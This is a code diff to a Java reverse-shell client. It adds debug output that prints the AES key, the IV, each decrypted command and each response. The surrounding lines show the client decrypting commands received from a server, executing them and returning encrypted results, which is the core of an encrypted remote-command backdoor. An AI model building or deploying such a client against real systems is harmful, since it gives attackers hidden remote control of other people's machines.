@@ -17,6 +17,16 @@ public class ReverseShellClient {
     private PublicKey serverPublicKey;
 
     public static void main(String[] args) throws Exception {
+        // Ensure AES Key and IV are initialized
+        if (Constants.AES_SECRET_KEY == null || Constants.IV == null) {
+            System.err.println("Failed to initialize AES key or IV.");
+            return;
+        }
+
+        // Log the initialized AES key and IV
+        System.out.println("AES Key (Base64): " + CryptoUtils.secretKeyToBase64(Constants.AES_SECRET_KEY));
+        System.out.println("IV (Base64): " + CryptoUtils.ivToBase64(Constants.IV));
+
         ReverseShellClient client = new ReverseShellClient();
         client.start();
     }
@@ -64,6 +74,9 @@ public class ReverseShellClient {
                 break;
             }
 
+            // Log the decrypted command
+            System.out.println("Decrypted Command: " + command);
+
             String result = executeCommand(command);
             sendResponse(result);
         }
@@ -106,7 +119,9 @@ public class ReverseShellClient {
 
     private String decryptCommand(String encryptedCommand) {
         try {
-            return CryptoUtils.decryptAES(encryptedCommand, Constants.AES_SECRET_KEY, Constants.IV);
+            String decryptedCommand = CryptoUtils.decryptAES(encryptedCommand, Constants.AES_SECRET_KEY, Constants.IV);
+            System.out.println("Decrypted Command: " + decryptedCommand);
+            return decryptedCommand;
         } catch (Exception e) {
             System.err.println("Error decrypting command: " + e.getMessage());
             return "";
@@ -116,6 +131,8 @@ public class ReverseShellClient {
     private void sendResponse(String response) {
         try {
             String encryptedResponse = CryptoUtils.encryptAES(response, Constants.AES_SECRET_KEY, Constants.IV);
+            System.out.println("Raw Response before Encryption: " + response);
+            System.out.println("Encrypted Response (Base64): " + encryptedResponse);
             out.println(encryptedResponse);
         } catch (Exception e) {
             System.err.println("Error encrypting response: " + e.getMessage());
